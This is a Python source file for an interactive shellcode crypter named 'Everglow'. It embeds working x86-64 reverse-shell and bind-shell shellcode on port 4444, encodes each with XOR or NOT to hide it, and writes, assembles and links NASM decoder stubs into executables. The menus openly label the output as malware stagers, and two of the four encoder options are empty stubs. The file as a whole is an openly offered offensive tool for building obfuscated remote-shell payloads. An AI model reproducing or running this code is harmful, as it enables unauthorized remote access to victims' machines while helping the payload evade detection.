import os
from random import randrange
from colorama import *
init()

rev_shell_shellcode = (b"\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x83\xc0\x29\x48\x83\xc7\x02\x48\xff\xc6\x0f\x05\x48\x89\xc7\x31\xc0\x50\xc7\x44\x24\xfc\x7f\x00\x00\x01\x66\xc7\x44\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x02\x00\x48\x83\xec\x08\x31\xc0\x48\x83\xc0\x2a\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x10\x0f\x05\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x0f\x05\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x48\xff\xc6\x0f\x05\x31\xc0\x83\xc0\x21\x48\x31\xf6\x48\x83\xc6\x02\x0f\x05\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

bind_shell_shellcode = (b"\x31\xc0\x48\x83\xc0\x29\x48\x31\xff\x48\x83\xc7\x02\x48\x31\xf6\x48\xff\xc6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x31\xc0\x50\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x02\x00\x48\x83\xec\x08\x31\xc0\x48\x83\xc0\x31\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\x31\xc0\x48\x83\xc0\x32\x48\x31\xf6\x48\x83\xc6\x02\x0f\x05\x31\xc0\x48\x83\xc0\x2b\x48\x83\xec\x10\x48\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48\x89\xe2\x0f\x05\x49\x89\xc1\x31\xc0\x48\x83\xc0\x03\x0f\x05\x4c\x89\xcf\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x0f\x05\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x48\xff\xc6\x0f\x05\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x48\xff\xc6\x48\xff\xc6\x0f\x05\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

class InsertionEncoderHandler:
    def __init__(self, boolean):
        self.boolean = boolean
        self.encoded = ""
        self.encoded_1 = ""
        self.unencrypted = rev_shell_shellcode
        self.assembly_template = '''
global _start
section .text

_start:
        '''
        
    def Encode(self):
        pass

class NotEncoderHandler:
    def __init__(self, boolean):
        self.boolean = boolean
        self.encoded = ""
        self.encoded_1 = ""
        self.unencrypted = rev_shell_shellcode
        self.rev_shell_decoder = '''
global _start
section .text

_start:
    jmp find_address

decoder:
    pop rdi
    xor rcx, rcx
    add rcx, 141
    
decode:
    not byte [rdi]
    inc rdi
    loop decode

    jmp short encoded_shellcode

find_address:
    call decoder
        '''
        self.bind_shell_decoder = '''
global _start
section .text

_start:
    jmp find_address

decoder:
    pop rdi
    xor rcx, rcx
    add rcx, 197

decode:
    not byte [rdi]
    inc rdi
    loop decode

    jmp short encoded_shellcode

find_address:
    call decoder
        '''
        self.final_decoder = self.rev_shell_decoder

    def Encrypt(self):
        print(Fore.CYAN + "\n\n*************")
        print(Fore.CYAN + "*NOT ENCODER*")
        print(Fore.CYAN + "*************")

        print(Fore.WHITE + "\nEncoded shellcode:\n")

        if self.boolean == True:
            print(Fore.WHITE + "\n[+] Encoding a reverse shell")
            self.unencrypted = rev_shell_shellcode
            self.final_decoder = self.rev_shell_decoder

        else:
            print(Fore.WHITE + "\n[+] Encoding a bind shell")
            self.unencrypted = bind_shell_shellcode
            self.final_decoder = self.bind_shell_decoder

        print(Fore.YELLOW + "STATUS: " + Fore.RED + "[+] Beginning NOT encryption")

        for x in bytearray(self.unencrypted):
            y = ~x

            self.encoded += "\\x"
            self.encoded += "%02x" % (y & 0xff)

            self.encoded_1 += "0x"
            self.encoded_1 += "%02x," % (y & 0xff)

        print(Fore.YELLOW + "STATUS: " + Fore.RED + "[+] Encryption finished")
        print(Fore.YELLOW + "STATUS: " + Fore.RED + "[+] Generating decoder stub and final executable...")

        print(Fore.YELLOW + "STATUS: " + Fore.RED + "[+] Finished!")
        print(Fore.WHITE + self.final_decoder + "\n\tencoded_shellcode: db " + self.encoded_1)

        f = open("shell_1.nasm", "w")
        f.write(self.final_decoder)
        f.close()
        f = open("shell_1.nasm", "a")
        f.write("\n\tencoded_shellcode: db " + self.encoded_1 + "\n")
        f.close()

        print(Fore.YELLOW + "\nSTATUS: " + Fore.RED + "[+] Assembling and linking final executbale, named shell_1")

        os.system("nasm -felf64 shell_1.nasm -o shell_1.o")
        os.system("ld shell_1.o -N -o shell_1")

        f.close()


class XorEncoderHandler:
    def __init__(self, boolean):
        self.boolean = boolean
        self.rev_shell_decoder = '''
global _start
section .text

_start:
    jmp find_address

decoder:
    pop rdi
    xor rcx, rcx
    add rcx, 141

decode:
    xor byte [rdi], 0xAA
    inc rdi
    loop decode

    jmp short encoded_shellcode

find_address:
    call decoder
        '''
    
        self.bind_shell_decoder = '''
global _start
section .text

_start:
    jmp find_address

decoder:
    pop rdi
    xor rcx, rcx
    add rcx, 197

decode:
    xor byte [rdi], 0xAA
    inc rdi
    loop decode

    jmp short encoded_shellcode
find_address:
    call decoder
        '''

        self.encoded = ""
        self.encoded_1 = ""
        self.unencrypted = rev_shell_shellcode
        self.final_decoder = self.rev_shell_decoder

    def Encrypt(self):
        print(Fore.CYAN + "\n\n*************")
        print(Fore.CYAN + "*XOR ENCODER*")
        print(Fore.CYAN + "*************")

        if self.boolean == True:
            print(Fore.WHITE + "\n[+] Encoding a reverse shell")
            self.unencrypted = rev_shell_shellcode
            self.final_decoder = self.rev_shell_decoder

        else:
            print(Fore.WHITE + "\n[+] Encoding a bind shell")
            self.unencrypted = bind_shell_shellcode
            self.final_decoder = self.bind_shell_decoder

        print(Fore.YELLOW + "\nSTATUS: " + Fore.RED + "[+] Beginning XOR encryption")
        
        for x in bytearray(self.unencrypted):
            y = x ^ 0xAA
            self.encoded += "\\x"
            self.encoded += "%02x" % y

            self.encoded_1 += "0x"
            self.encoded_1 += "%02x," % y

        print(Fore.YELLOW + "STATUS: " + Fore.RED + "[+] Encryption finished")
        print(Fore.YELLOW + "STATUS: " + Fore.RED + "[+] Generating decoder stub and final executable...")

        print(Fore.YELLOW + "STATUS: " + Fore.RED + "[+] Finished!")
        print(Fore.WHITE + self.final_decoder + "\n\tencoded_shellcode: db " + self.encoded_1)

        f = open("shell.nasm", "w")
        f.write(self.final_decoder)
        f.close()
        f = open("shell.nasm", "a")
        f.write("\n\tencoded_shellcode: db " + self.encoded_1)
        f.close()

        print(Fore.YELLOW + "\nSTATUS: " + Fore.RED + "[+] Assembling and Linking final file, named shell, check pwd")
    
        os.system("nasm -felf64 shell.nasm -o shell.o")
        os.system("ld shell.o -N -o shell")

class BannerHandler:
    def __init__(self, number):
        self.number = number

    def first_banner(self):
        print(Fore.GREEN + " /$$$$$$$$ /$$    /$$ /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$        /$$$$$$  /$$      /$$")
        print(Fore.GREEN + "| $$_____/| $$   | $$| $$_____/| $$__  $$ /$$__  $$| $$       /$$__  $$| $$  /$ | $$")
        print(Fore.GREEN + "| $$      | $$   | $$| $$      | $$  \ $$| $$  \__/| $$      | $$  \ $$| $$ /$$$| $$")
        print(Fore.GREEN + "| $$$$$   |  $$ / $$/| $$$$$   | $$$$$$$/| $$ /$$$$| $$      | $$  | $$| $$/$$ $$ $$")
        print(Fore.GREEN + "| $$__/    \  $$ $$/ | $$__/   | $$__  $$| $$|_  $$| $$      | $$  | $$| $$$$_  $$$$")
        print(Fore.GREEN + "| $$        \  $$$/  | $$      | $$  \ $$| $$  \ $$| $$      | $$  | $$| $$$/ \  $$$")
        print(Fore.GREEN + "| $$$$$$$$   \  $/   | $$$$$$$$| $$  | $$|  $$$$$$/| $$$$$$$$|  $$$$$$/| $$/   \  $$")
        print(Fore.GREEN + "|________/    \_/    |________/|__/  |__/ \______/ |________/ \______/ |__/     \__/")
        print(Fore.GREEN + "\n\t\t Developed by Declan M. AKA __cdeclan on the mic")

    def second_banner(self):
        print(Fore.GREEN + " _______           _______  _______  _______  __       _______          ")
        print(Fore.GREEN + "(  ____ \|\     /|(  ____ \(  ____ )(  ____ \( \      (  ___  )|\     /|")
        print(Fore.GREEN + "| (    \/| )   ( || (    \/| (    )|| (    \/| (      | (   ) || )   ( |")
        print(Fore.GREEN + "| (__    | |   | || (__    | (____)|| |      | |      | |   | || | _ | |")
        print(Fore.GREEN + "|  __)   ( (   ) )|  __)   |     __)| | ____ | |      | |   | || |( )| |")
        print(Fore.GREEN + "| (       \ \_/ / | (      | (\ (   | | \_  )| |      | |   | || || || |")
        print(Fore.GREEN + "| (____/\  \   /  | (____/\| ) \ \__| (___) || (____/\| (___) || () () |")
        print(Fore.GREEN + "(_______/   \_/   (_______/|/   \__/(_______)(_______/(_______)(_______)")
        print(Fore.GREEN + "\n\t\t Developed by Declan M. AKA __cdeclan on the mic")

    def third_banner(self):
        print(Fore.GREEN + "███████╗██╗   ██╗███████╗██████╗  ██████╗ ██╗      ██████╗ ██╗    ██╗")
        print(Fore.GREEN + "██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝ ██║     ██╔═══██╗██║    ██║")
        print(Fore.GREEN + "█████╗  ██║   ██║█████╗  ██████╔╝██║  ███╗██║     ██║   ██║██║ █╗ ██║")
        print(Fore.GREEN + "██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║   ██║██║     ██║   ██║██║███╗██║")
        print(Fore.GREEN + "███████╗ ╚████╔╝ ███████╗██║  ██║╚██████╔╝███████╗╚██████╔╝╚███╔███╔╝")
        print(Fore.GREEN + "╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚══╝╚══╝ ")
        print(Fore.GREEN + "\n\t\t Developed by Declan M. AKA __cdeclan on the mic")

def main():
    num = randrange(3)
    banner = BannerHandler(num)

    banner_options = {0 : banner.first_banner, 1 : banner.second_banner, 2 : banner.third_banner}
    banner_options[num]()

    print(Fore.CYAN + "\n\n**************")
    print(Fore.CYAN + "*Malware Info*")
    print(Fore.CYAN + "**************\n")

    print(Fore.YELLOW + "NASM Reverse Shell: " + Fore.RED + "Connects to a listener on port 4444 hardcoded host")
    print(Fore.YELLOW + "NASM Bind Shell: " + Fore.RED + "Opens a listener on the victim machine, port 4444")

    print(Fore.CYAN + "\n\n*****************")
    print(Fore.CYAN + "*Encoder Choices*")
    print(Fore.CYAN + "*****************\n")

    print(Fore.WHITE + "[1] XOR Encoder [stager]")
    print(Fore.WHITE + "[2] NOT Encoder [stager]")
    print(Fore.WHITE + "[3] Insertion Encoder [stager]")
    print(Fore.WHITE + "[4] Random Insertion Encoder [stager]")

    print(Fore.GREEN + "\nSelect Encoder by Index")
    choice = input("Everglow => ")

    print(Fore.CYAN + "\n\n*****************")
    print(Fore.CYAN + "*Payload Choices*")
    print(Fore.CYAN + "*****************\n")

    print(Fore.WHITE + "[1] Reverse TCP NASM Shell")
    print(Fore.WHITE + "[2] Bind TCP NASM Shell")

    print(Fore.GREEN + "\nSelect Payload by Index")
    payload_choice = input("Everglow => ")

    if int(payload_choice) == 1:
        boolean = True

    else:
        boolean = False

    if int(choice) == 1:
        Crypter = XorEncoderHandler(boolean)
        Crypter.Encrypt()

    elif int(choice) == 2:
        Crypter = NotEncoderHandler(boolean)
        Crypter.Encrypt()

    elif int(choice) == 3:
        pass

    elif int(choice) == 4:
        pass

if __name__ == '__main__':
    main()
